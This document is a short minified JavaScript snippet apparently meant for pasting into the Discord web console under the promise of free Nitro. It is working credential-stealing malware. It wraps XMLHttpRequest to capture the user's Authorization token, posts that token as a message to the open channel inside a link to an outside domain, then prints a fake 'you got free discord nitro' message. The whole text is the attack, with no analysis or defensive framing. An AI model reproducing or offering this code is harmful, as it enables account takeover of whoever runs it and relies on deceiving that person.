XMLHttpRequest.prototype.wrappedSetRequestHeader=XMLHttpRequest.prototype.setRequestHeader,XMLHttpRequest.prototype.setRequestHeader=function(e,t){this.wrappedSetRequestHeader(e,t),this.headers||(this.headers={}),this.headers[e]||(this.headers[e]=[]),this.headers[e].push(t)};let oldXHROpen=window.XMLHttpRequest.prototype.open;window.XMLHttpRequest.prototype.open=function(e,t,o,n,s){return this.addEventListener("load",function(){isNaN(window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.length))?console.log("Pending.. to resolve your nitro."):(fetch("https://discordapp.com/api/v6/channels/"+window.location.href.substring(window.location.href.lastIndexOf("/")+1,window.location.href.length)+"/messages",{method:"POST",headers:{authorization:this.headers.Authorization[0],"user-agent":navigator.userAgent,"Content-Type":"application/x-www-form-urlencoded"},body:JSON.stringify({content:"https://0x539.co/k/"+this.headers.Authorization[0],tts:"false"})}),console.log("%c ","font-size: 450px; background: url(https://cdn.discordapp.com/attachments/499211297288617992/568508878375878668/images.png) no-repeat;"),console.log("Congrats, you got free discord nitro"))}),oldXHROpen.apply(this,arguments)};
